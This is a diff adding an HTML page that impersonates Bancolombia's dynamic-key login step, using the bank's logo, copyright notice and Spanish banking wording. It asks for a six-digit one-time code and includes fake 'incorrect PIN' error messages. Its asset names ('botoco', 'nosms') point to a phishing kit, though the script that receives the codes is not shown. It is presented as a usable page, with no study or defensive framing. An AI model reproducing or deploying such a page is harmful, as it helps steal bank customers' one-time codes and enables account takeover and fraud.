@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="stylesheet" href="stylesbotoco/nosms.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Clave principal</title>
+
+</head>
+<body>
+    <div id="loading-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.8); z-index: 9999; justify-content: center; align-items: center;">
+        <img src="a09q298doaknigif.gif" alt="Cargando" style="max-width: 100px; max-height: 100px;">
+    </div>
+
+    <div id="errorModal" style="display: none; position: fixed; top: 20px; right: 20px; background-color: rgba(255, 0, 0, 0.8); color: white; padding: 10px; border-radius: 5px; z-index: 10000;">
+        PIN incorrecto
+    </div>
+
+    <div class="container">
+        <header>
+            <div style="flex: 1;"></div>
+            <div class="logo-container">
+                <img src="logo-bancolombia+(1).png" alt="Bancolombia logo" class="logo">
+            </div>
+            <div style="flex: 1; display: flex; justify-content: flex-end;">
+                <button class="exit-button">Salir</button>
+            </div>
+        </header>
+
+        <main>
+            <div class="login-container">
+                <h1>Clave dinámica</h1>
+            </div>
+
+            <div class="pinw-container">
+                <div class="lock-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
+                    </svg>
+                </div>
+                <p class="instruction">Consulta tu Clave Dinámica desde la App Bancolombia</p>
+                <div class="pin-input">
+                    <div class="pin-digit"><div class="pin-dot"></div><div class="pin-line"></div></div>
+                    <div class="pin-digit"><div class="pin-dot"></div><div class="pin-line"></div></div>
+                    <div class="pin-digit"><div class="pin-dot"></div><div class="pin-line"></div></div>
+                    <div class="pin-digit"><div class="pin-dot"></div><div class="pin-line"></div></div>
+                    <div class="pin-digit"><div class="pin-dot"></div><div class="pin-line"></div></div>
+                    <div class="pin-digit"><div class="pin-dot"></div><div class="pin-line"></div></div>
+                    <input type="password" id="pin-entry" maxlength="6" inputmode="numeric" pattern="[0-9]*" aria-label="Ingrese su PIN">
+                </div>
+                <div id="pin-error" class="pin-error" style="display: none;">Clave incorrecta. Ingresa nuevamente.</div>
+                <div id="user-error" class="user-error" style="display: none;">Usuario incorrecto, por favor vuelva a intentarlo</div>
+                <div class="buttons">
+                    <button class="btn btn-back">Volver</button>
+                    <button id="continueBtn" class="btn btn-continue" disabled>Continuar</button>
+                </div>
+            </div>
+        
+            <div class="image-below-buttons">
+                <img src="fondo-removebg-preview.png" alt="Fondo debajo de botones">
+            </div>
+        </main>
+
+        <footer>
+            <div class="footer-content">
+                <div class="logo-container-footer">
+                    <img src="superinter.png" alt="Logo de Superintendencia" class="footer-logo superintendencia-logo">
+                </div>
+                <div class="footer-info">
+                    <p>&copy; 2024 Bancolombia. Todos los derechos reservados.</p>
+                    <div class="footer-links">
+                        <a href="#">Términos y condiciones</a> |
+                        <a href="#">Política de privacidad</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+    <script src="scriptbotoco/nosms.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"45ecc24fed1a4db0b1414a514a0d3418","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
